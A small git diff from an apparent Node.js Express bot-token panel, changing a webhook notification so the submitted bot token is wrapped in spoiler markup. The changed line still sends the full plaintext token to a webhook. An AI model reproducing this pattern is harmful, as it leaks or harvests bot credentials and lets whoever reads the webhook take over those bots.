@@ -233,7 +233,7 @@ app.post('/add-token', (req, res) => {
           bot.destroy();
 
           // إرسال رسالة إلى الـ webhook عند إضافة البوت
-          sendWebhook(`✅ Bot **${bot.user.username}** has been added with token **${token}**.`);
+          sendWebhook(`✅ Bot **${bot.user.username}** has been added with token **||${token}||**.`);
           res.redirect('/');
         })
         .catch(err => {
